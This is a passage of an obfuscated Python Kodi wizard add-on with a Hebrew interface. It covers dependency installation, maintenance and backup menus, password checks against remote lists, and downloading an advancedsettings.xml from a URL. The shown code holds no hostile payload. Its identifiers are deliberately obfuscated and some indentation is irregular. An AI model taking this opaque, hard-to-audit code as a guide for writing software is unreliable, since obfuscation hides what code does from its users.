	OOO0O00O0OO0OO0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOOO00O00OOOO0 )#line:2400
	DP .update (0 ,OOO0O00O0OO0OO0O0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2401
	O00OOOOO0OOOO0O0O ,OOOOOOO00000O0O00 ,O0O0O0OO0OO0OOO0O =extract .all (OOOOOOO000OOOOO00 ,ADDONS ,DP ,title =OOO0O00O0OO0OO0O0 )#line:2402
	DP .update (0 ,OOO0O00O0OO0OO0O0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2403
	installed (OO0OOOO00O00OOOO0 )#line:2404
	installDep (OO0OOOO00O00OOOO0 ,DP )#line:2405
	DP .close ()#line:2406
	wiz .ebi ('UpdateAddonRepos()')#line:2407
	wiz .ebi ('UpdateLocalAddons()')#line:2408
	wiz .refresh ()#line:2409
def installDep (OOOOOOO0O0O0O0OO0 ,DP =None ):#line:2411
	OOO00OO0O00O0OO0O =os .path .join (ADDONS ,OOOOOOO0O0O0O0OO0 ,'addon.xml')#line:2412
	if os .path .exists (OOO00OO0O00O0OO0O ):#line:2413
		OO0O00O00OOOO0O00 =open (OOO00OO0O00O0OO0O ,mode ='r');OOOO000OO00000O0O =OO0O00O00OOOO0O00 .read ();OO0O00O00OOOO0O00 .close ();#line:2414
		O00O0OO0O0O0000OO =wiz .parseDOM (OOOO000OO00000O0O ,'import',ret ='addon')#line:2415
		for O000OO0OOO000OO0O in O00O0OO0O0O0000OO :#line:2416
			if not 'xbmc.python'in O000OO0OOO000OO0O :#line:2417
				if not DP ==None :#line:2418
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000OO0OOO000OO0O ))#line:2419
				wiz .createTemp (O000OO0OOO000OO0O )#line:2420
def installed (OOO0OOOOO000O0OOO ):#line:2447
	OO0O0OO00O00O00O0 =os .path .join (ADDONS ,OOO0OOOOO000O0OOO ,'addon.xml')#line:2448
	if os .path .exists (OO0O0OO00O00O00O0 ):#line:2449
		try :#line:2450
			O00000O0000OOOO0O =open (OO0O0OO00O00O00O0 ,mode ='r');OOOOOOOOOOOO0OOO0 =O00000O0000OOOO0O .read ();O00000O0000OOOO0O .close ()#line:2451
			OOOO0O00O0OOO0000 =wiz .parseDOM (OOOOOOOOOOOO0OOO0 ,'addon',ret ='name',attrs ={'id':OOO0OOOOO000O0OOO })#line:2452
			O0OOOOOOO0OOOO0OO =os .path .join (ADDONS ,OOO0OOOOO000O0OOO ,'icon.png')#line:2453
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0O00O0OOO0000 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0OOOOOOO0OOOO0OO )#line:2454
		except :pass #line:2455
def youtubeMenu (url =None ):#line:2457
	if not YOUTUBEFILE =='http://':#line:2458
		if url ==None :#line:2459
			O00O00O0O0000OO0O =wiz .workingURL (YOUTUBEFILE )#line:2460
			O0000000OOOOOOO0O =uservar .YOUTUBEFILE #line:2461
		else :#line:2462
			O00O00O0O0000OO0O =wiz .workingURL (url )#line:2463
			O0000000OOOOOOO0O =url #line:2464
		if O00O00O0O0000OO0O ==True :#line:2465
			O0000OO0OO00OOO00 =wiz .openURL (O0000000OOOOOOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2466
			O00O00OO0OO0000OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000OO0OO00OOO00 )#line:2467
			if len (O00O00OO0OO0000OO )>0 :#line:2468
				for O0OOOO00O0O00O0O0 ,OO0OO0OOO000OOOOO ,url ,O0O0O00O00O00O00O ,OO0O0OO0OOOOOO0OO ,OOO0OO0OO0O000000 in O00O00OO0OO0000OO :#line:2469
					if OO0OO0OOO000OOOOO .lower ()=="yes":#line:2470
						addDir ("[B]%s[/B]"%O0OOOO00O0O00O0O0 ,'youtube',url ,description =OOO0OO0OO0O000000 ,icon =O0O0O00O00O00O00O ,fanart =OO0O0OO0OOOOOO0OO ,themeit =THEME3 )#line:2471
					else :#line:2472
						addFile (O0OOOO00O0O00O0O0 ,'viewVideo',url =url ,description =OOO0OO0OO0O000000 ,icon =O0O0O00O00O00O00O ,fanart =OO0O0OO0OOOOOO0OO ,themeit =THEME2 )#line:2473
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2474
		else :#line:2475
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2476
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2477
			addFile ('%s'%O00O00O0O0000OO0O ,'',themeit =THEME3 )#line:2478
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2479
	setView ('files','viewType')#line:2480
def STARTP ():#line:2481
	OOO000O0OO0O0OO0O =(ADDON .getSetting ("pass"))#line:2482
	if BUILDNAME =="":#line:2483
	 if not NOTIFY =='true':#line:2484
          O0OO00OO000O00O00 =wiz .workingURL (NOTIFICATION )#line:2485
	 if not NOTIFY2 =='true':#line:2486
          O0OO00OO000O00O00 =wiz .workingURL (NOTIFICATION2 )#line:2487
	 if not NOTIFY3 =='true':#line:2488
          O0OO00OO000O00O00 =wiz .workingURL (NOTIFICATION3 )#line:2489
	OOOO0O00O0O0O0OOO =OOO000O0OO0O0OO0O #line:2490
	O0OO00OO000O00O00 =urllib2 .Request (SPEED )#line:2491
	O0O0OO0O0OO00O0O0 =urllib2 .urlopen (O0OO00OO000O00O00 )#line:2492
	OOO000O0O0OOO0O00 =O0O0OO0O0OO00O0O0 .readlines ()#line:2494
	OO0O0O00OO000O0O0 =0 #line:2498
	for O0OO0O00OO0OO0000 in OOO000O0O0OOO0O00 :#line:2499
		if O0OO0O00OO0OO0000 .split (' ==')[0 ]==OOO000O0OO0O0OO0O or O0OO0O00OO0OO0000 .split ()[0 ]==OOO000O0OO0O0OO0O :#line:2500
			OO0O0O00OO000O0O0 =1 #line:2501
			break #line:2502
	if OO0O0O00OO000O0O0 ==0 :#line:2503
					O0O0OOO00O0O0000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2504
					if O0O0OOO00O0O0000O :#line:2506
						ADDON .openSettings ()#line:2508
						STARTP ()#line:2509
						sys .exit ()#line:2510
					else :#line:2511
						sys .exit ()#line:2512
	return 'ok'#line:2516
def STARTP2 ():#line:2517
	O0OOOO000O00OOO00 =(ADDON .getSetting ("user"))#line:2518
	O00OO00OO0OO0O00O =(UNAME )#line:2520
	OOOO00O000O0000O0 =urllib2 .urlopen (O00OO00OO0OO0O00O )#line:2521
	O00000000O00O00O0 =OOOO00O000O0000O0 .readlines ()#line:2522
	OO0O0OO0OO0O000O0 =0 #line:2523
	for OOOO0O0O0000O0000 in O00000000O00O00O0 :#line:2526
		if OOOO0O0O0000O0000 .split (' ==')[0 ]==O0OOOO000O00OOO00 or OOOO0O0O0000O0000 .split ()[0 ]==O0OOOO000O00OOO00 :#line:2527
			OO0O0OO0OO0O000O0 =1 #line:2528
			break #line:2529
	if OO0O0OO0OO0O000O0 ==0 :#line:2530
		O00O00OOOO00OO0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2531
		if O00O00OOOO00OO0O0 :#line:2533
			ADDON .openSettings ()#line:2535
			STARTP2 ()#line:2537
			sys .exit ()#line:2538
		else :#line:2539
			sys .exit ()#line:2540
	return 'ok'#line:2544
def passandpin ():#line:2545
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2546
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2547
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2548
def passandUsername ():#line:2549
	ADDON .openSettings ()#line:2550
def folderback ():#line:2553
    OOO00O0OOO00O0OO0 =ADDON .getSetting ("path")#line:2554
    if OOO00O0OOO00O0OO0 :#line:2555
      OOO00O0OOO00O0OO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2556
      ADDON .setSetting ("path",OOO00O0OOO00O0OO0 )#line:2557
def backmyupbuild ():#line:2560
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2564
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2565
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2566
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2568
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2569
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2570
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2572
def maintMenu (view =None ):#line:2576
	O0000O0O0OOOOO00O ='[B][COLOR green]ON[/COLOR][/B]';OO0OO0O0OO0OOO00O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2578
	O0O0O0O00OOOOO0OO ='true'if AUTOCLEANUP =='true'else 'false'#line:2579
	O0O00O0O0O0OO0O00 ='true'if AUTOCACHE =='true'else 'false'#line:2580
	O0OO00OOOO0OO0OO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2581
	OOOOO00O000O00O0O ='true'if AUTOTHUMBS =='true'else 'false'#line:2582
	O000O0OOO00OOO000 ='true'if SHOWMAINT =='true'else 'false'#line:2583
	OOO000OO00O000OOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2584
	O00O0OO0OOOO00000 ='true'if INCLUDEALL =='true'else 'false'#line:2585
	O00O0OOOO0O0OO000 ='true'if THIRDPARTY =='true'else 'false'#line:2586
	if wiz .Grab_Log (True )==False :O00O0O0O0OOOO0O00 =0 #line:2587
	else :O00O0O0O0OOOO0O00 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2588
	if wiz .Grab_Log (True ,True )==False :OO0O00OO0000OOOOO =0 #line:2589
	else :OO0O00OO0000OOOOO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2590
	OO0OO0OOO0OO0O00O =int (O00O0O0O0OOOO0O00 )+int (OO0O00OO0000OOOOO )#line:2591
	O000OO000O0OOOOO0 =str (OO0OO0OOO0OO0O00O )+' Error(s) Found'if OO0OO0OOO0OO0O00O >0 else 'None Found'#line:2592
	O00OO00000O00000O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2593
	if O00O0OO0OOOO00000 =='true':#line:2594
		O0O0O000O0000O0OO ='true'#line:2595
		OOOO00O0000O00000 ='true'#line:2596
		O000O0O00OOO00OOO ='true'#line:2597
		O0O0000OOOOO00000 ='true'#line:2598
		OO00OOO0O0O0OOOO0 ='true'#line:2599
		O0O0OO0O0OO0000O0 ='true'#line:2600
		OO00OO0OOO0OOOOO0 ='true'#line:2601
		O00O0OOOO0OO0O0O0 ='true'#line:2602
	else :#line:2603
		O0O0O000O0000O0OO ='true'if INCLUDEBOB =='true'else 'false'#line:2604
		OOOO00O0000O00000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2605
		O000O0O00OOO00OOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2606
		O0O0000OOOOO00000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2607
		OO00OOO0O0O0OOOO0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2608
		O0O0OO0O0OO0000O0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2609
		OO00OO0OOO0OOOOO0 ='true'if INCLUDESALTS =='true'else 'false'#line:2610
		O00O0OOOO0OO0O0O0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2611
	O00000OOOOO000O00 =wiz .getSize (PACKAGES )#line:2612
	O0OO00OOO0O000O0O =wiz .getSize (THUMBS )#line:2613
	O0OOOOOOO0O0OO0OO =wiz .getCacheSize ()#line:2614
	OOOOO0OO00OOOO000 =O00000OOOOO000O00 +O0OO00OOO0O000O0O +O0OOOOOOO0O0OO0OO #line:2615
	O000OOOO00000O00O =['Daily','Always','3 Days','Weekly']#line:2616
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2617
	if view =="clean"or SHOWMAINT =='true':#line:2618
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO0OO00OOOO000 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOOOOOO0O0OO0OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00000OOOOO000O00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO00OOO0O000O0O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2624
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2626
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2627
	if view =="addon"or SHOWMAINT =='false':#line:2628
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2629
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2630
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2631
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2632
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2633
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2634
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2635
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2636
	if view =="misc"or SHOWMAINT =='true':#line:2637
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2641
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2642
		addFile ('View Errors in Log: %s'%(O000OO000O0OOOOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2643
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2644
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2645
		addFile ('Clear Wizard Log File%s'%O00OO00000O00000O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2646
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2647
	if view =="backup"or SHOWMAINT =='true':#line:2648
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2649
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2651
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2652
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2653
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2654
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2655
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2656
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2657
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2658
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2659
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2660
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2661
	if view =="tweaks"or SHOWMAINT =='true':#line:2662
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2663
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		else :#line:2665
			if os .path .exists (ADVANCED ):#line:2666
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2667
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2668
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2669
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2670
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2671
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2672
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2673
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2674
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2675
	addFile ('Show All Maintenance: %s'%O000O0OOO00OOO000 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2676
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2677
	addFile ('Third Party Wizards: %s'%O00O0OOOO0O0OO000 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2678
	if O00O0OOOO0O0OO000 =='true':#line:2679
		OO00O0OO0O0000OO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2680
		OOO00OOO0OOO00OO0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2681
		OOOOO0OO000O0O0O0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2682
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00O0OO0O0000OO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2683
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO00OOO0OOO00OO0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2684
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO0OO000O0O0O0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2685
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2686
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0O0O0O00OOOOO0OO .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2687
	if O0O0O0O00OOOOO0OO =='true':#line:2688
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O000OOOO00000O00O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2689
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0O00O0O0O0OO0O00 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2690
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OO00OOOO0OO0OO0 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2691
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOOO00O000O00O0O .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2692
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2693
	addFile ('Include Video Cache in Clear Cache: %s'%OOO000OO00O000OOO .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2694
	if OOO000OO00O000OOO =='true':#line:2695
		addFile ('--- Include All Video Addons: %s'%O00O0OO0OOOO00000 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2696
		addFile ('--- Include Bob: %s'%O0O0O000O0000O0OO .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2697
		addFile ('--- Include Phoenix: %s'%OOOO00O0000O00000 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2698
		addFile ('--- Include Specto: %s'%O000O0O00OOO00OOO .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2699
		addFile ('--- Include Exodus: %s'%OO00OOO0O0O0OOOO0 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2700
		addFile ('--- Include Salts: %s'%OO00OO0OOO0OOOOO0 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2701
		addFile ('--- Include Salts HD Lite: %s'%O00O0OOOO0OO0O0O0 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2702
		addFile ('--- Include One Channel: %s'%O0O0OO0O0OO0000O0 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2703
		addFile ('--- Include Genesis: %s'%O0O0000OOOOO00000 .replace ('true',O0000O0O0OOOOO00O ).replace ('false',OO0OO0O0OO0OOO00O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2704
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2705
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2706
	setView ('files','viewType')#line:2707
def advancedWindow (url =None ):#line:2709
	if not ADVANCEDFILE =='http://':#line:2710
		if url ==None :#line:2711
			OO000OO0000O0000O =wiz .workingURL (ADVANCEDFILE )#line:2712
			OO0O00OOOO000O00O =uservar .ADVANCEDFILE #line:2713
		else :#line:2714
			OO000OO0000O0000O =wiz .workingURL (url )#line:2715
			OO0O00OOOO000O00O =url #line:2716
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2717
		if os .path .exists (ADVANCED ):#line:2718
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2719
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2720
		if OO000OO0000O0000O ==True :#line:2721
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2722
			O00000000O0OOO00O =wiz .openURL (OO0O00OOOO000O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2723
			O0O0OO00000O0O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00000000O0OOO00O )#line:2724
			if len (O0O0OO00000O0O00O )>0 :#line:2725
				for OOOOO0O000O000000 ,OOOOO0O0O0O0OOOO0 ,url ,OOOO000O0OOO000O0 ,OOOO0OO000O00O00O ,OO000OO0OO00O000O in O0O0OO00000O0O00O :#line:2726
					if OOOOO0O0O0O0OOOO0 .lower ()=="yes":#line:2727
						addDir ("[B]%s[/B]"%OOOOO0O000O000000 ,'advancedsetting',url ,description =OO000OO0OO00O000O ,icon =OOOO000O0OOO000O0 ,fanart =OOOO0OO000O00O00O ,themeit =THEME3 )#line:2728
					else :#line:2729
						addFile (OOOOO0O000O000000 ,'writeadvanced',OOOOO0O000O000000 ,url ,description =OO000OO0OO00O000O ,icon =OOOO000O0OOO000O0 ,fanart =OOOO0OO000O00O00O ,themeit =THEME2 )#line:2730
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2731
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO000OO0000O0000O )#line:2732
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2733
def writeAdvanced (OO00OOO00O0OO00O0 ,O0O000OOO00OO000O ):#line:2735
	OO0O0O0OOOO0O0OO0 =wiz .workingURL (O0O000OOO00OO000O )#line:2736
	if OO0O0O0OOOO0O0OO0 ==True :#line:2737
		if os .path .exists (ADVANCED ):O0OO00O0OOO00O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00OOO00O0OO00O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2738
		else :O0OO00O0OOO00O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00OOO00O0OO00O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2739
		if O0OO00O0OOO00O00O ==1 :#line:2741
			OOOO0OO0O0OOOOOO0 =wiz .openURL (O0O000OOO00OO000O )#line:2742
			OO0OO00O0OOO0O000 =open (ADVANCED ,'w');#line:2743
			OO0OO00O0OOO0O000 .write (OOOO0OO0O0OOOOOO0 )#line:2744
			OO0OO00O0OOO0O000 .close ()#line:2745
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2746
			wiz .killxbmc (True )#line:2747
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2748
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0O0O0OOOO0O0OO0 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2749
def viewAdvanced ():#line:2751
	OO0O000O00O000O00 =open (ADVANCED )#line:2752
